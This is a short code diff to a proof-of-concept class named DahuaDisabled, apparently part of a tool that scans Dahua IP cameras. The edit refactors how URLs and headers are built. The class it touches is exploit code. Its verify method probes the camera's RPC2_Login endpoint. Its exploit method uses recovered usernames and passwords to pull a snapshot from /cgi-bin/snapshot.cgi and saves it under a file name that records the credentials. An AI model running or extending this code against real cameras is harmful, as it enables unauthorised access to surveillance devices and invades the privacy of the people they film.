@@ -18,12 +18,12 @@ class DahuaDisabled(POCTemplate):
         self.desc = ''
 
     def verify(self, ip, port=80):
-        url = f"http://{ip}:{port}/RPC2_Login"
+        url = self.url(ip, port, "/RPC2_Login")
         headers = {
             'User-Agent': self.config.user_agent,
-            'Host': ip,
-            'Origin': 'http://' + ip,
-            'Referer': 'http://' + ip,
+            'Host': f'{ip}:{port}',
+            'Origin': self.url(ip, port),
+            'Referer': self.url(ip, port),
             'Accept': 'application/json, text/javascript, */*; q=0.01',
             'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
             'Accept-Encoding': 'gzip, deflate',
@@ -55,7 +55,7 @@ class DahuaDisabled(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
+        url = self.url(ip, port, "/cgi-bin/snapshot.cgi")
         return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))
 
 
